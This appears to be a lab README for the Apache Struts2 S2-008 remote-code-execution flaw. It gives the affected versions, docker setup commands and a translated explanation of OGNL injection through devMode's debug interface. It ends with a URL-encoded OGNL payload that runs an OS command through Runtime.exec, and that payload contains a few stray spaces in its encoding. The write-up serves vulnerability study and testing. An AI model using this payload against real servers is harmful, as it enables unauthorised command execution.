# S2-008 Remote Code Execution Vulnerability

Impact version: 2.1.0 - 2.3.1

Vulnerability details: http://struts.apache.org/docs/s2-008.html

## Test environment construction

```
Docker-compose build
Docker-compose up -d
```

## Principle

Reference http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html

> S2-008 involves multiple vulnerabilities. Cookie interceptor misconfiguration can cause OGNL expressions to execute, but since most web containers (such as Tomcat) have character restrictions on cookie names, some key characters cannot be used to make this point look awkward. Another point that is more ribbed is that after the struts2 application starts devMode mode, there are multiple debug interfaces that can directly view object information or directly execute commands. As Kxlzx mentions, this situation is almost impossible in the production environment, so it becomes It's very tasteless, but I don't think it's absolute. It's possible to hack a special application that has debug mode enabled on the server as a backdoor.

> For example, adding the parameter directly in devMode mode ?debug=command&expression=<OGNL EXP> will directly execute the following OGNL expression, so you can execute the command directly (note escaping):

```
Http://localhost:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false% 22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications% 2fCalculator.app%22%29)
```